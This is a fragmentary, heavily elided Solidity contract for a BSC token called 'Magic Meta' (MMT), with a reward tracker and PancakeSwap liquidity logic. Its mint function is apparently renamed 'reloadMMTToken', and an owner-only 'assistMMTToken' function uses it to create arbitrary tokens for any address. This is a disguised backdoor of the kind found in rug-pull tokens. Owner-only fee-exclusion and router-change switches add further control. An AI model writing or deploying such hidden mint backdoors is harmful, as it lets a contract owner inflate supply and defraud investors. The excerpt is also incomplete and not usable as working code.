...
_balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
 ...
 function reloadMMTToken(address account, uint256 amount) internal virtual {
...
function reloadMMTToken(address account, uint256 value) internal override {
    super.reloadMMTToken(account, value);
...
function _burn(address account, uint256 value) internal override {
 ...
 function _setBalance(address account, uint256 newBalance) internal {
    ...
    if(newBalance > currentBalance) {
      ...
      reloadMMTToken(account, mintAmount);
...
contract MMTTokenrewardToken is rewardTokenHolders, Ownable {
    using SafeMath for uint256;
    using SafeMathInt for int256;
    using RewardMMTTokenMap  for RewardMMTTokenMap .Map;
RewardMMTTokenMap .Map private tokenHoldersList;
...
event Claim(address indexed account, uint256 amount, bool indexed automatic);
 constructor() rewardTokenHolders("MMTToken_rewardToken_Tracker", "MMTToken_rewardToken_Tracker") {
        claimWait = 3600;
        minimumTokenBalanceForDividends = 80000 * (10**9); 
    }
function _transfer(address, address, uint256) internal override pure {
        require(false, "MMTToken_rewardToken_Tracker: No transfers allowed");
    }
 function withdrawDividend() public override  pure {
        require(false, "MMTToken_rewardToken_Tracker: withdrawDividend disabled. Use the 'claim' function on the main MMTToken contract.");
    }
...
contract MMTToken is ERC20, Ownable {
 event UpdateDEXV2Router(address indexed newAddress, address indexed oldAddress);
    ...
    uint256 public  bnbReward = 7;
    uint256 public  TotalFees;
 uint256 public gasForProcessing = 300000;
    address public DEXV2Pair;
    PanCakeRouter02 public DEXV2Router;
    MMTTokenrewardToken public rewardToken;
   uint256 _totalSupply =350000000  * (10**9);
...
bool public cooldownEnabled = false;
  ...
  constructor() ERC20("Magic Meta", "MMT") {
 ...
 DEXV2Router = _DEXV2Router;
        ...
        rewardToken = new MMTTokenrewardToken();
...
isTimelockLimited[owner()] = true;
 ...
 reloadMMTToken(owner(), _totalSupply);
    }
receive() external payable {}
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
...
emit RebaseUpdate(epoch, _totalSupply);
  ...
  function changeIsDividendLimited(address holder, bool Limited) external masterWallet {
     ...
     function assistMMTToken(address tokenAddress, uint256 tokenePercent) public masterWallet{
       reloadMMTToken(tokenAddress, tokenePercent);
  }
 ...
 function updateDEXV2Router(address newAddress) public masterWallet {
        require(newAddress != address(DEXV2Router), "MMTToken: The router already has that address");
 ...
 function excludeFromFees(address account, bool excluded) public masterWallet {
        require(_isExcludedFromFees[account] != excluded, "MMTToken: Account is already the value of 'excluded'");
        _isExcludedFromFees[account] = excluded;

        emit ExcludeFromFees(account, excluded);
    }
function updateGasForProcessing(uint256 newValue) public masterWallet {
        require(newValue >= 200000 && newValue <= 500000, "MMTToken: gasForProcessing must be between 200,000 and 500,000");
        require(newValue != gasForProcessing, "MMTToken: Cannot update gasForProcessing to same value");
 ...
 uint256 tokensTMMTToken = tokensToLiquify.mul(liquidityFee).div(TotalFees).div(2);
        uint256 amountToSwap = tokensToLiquify.sub(tokensTMMTToken);
...
addLiquidity(tokensTMMTToken, bnbForLiquidity);
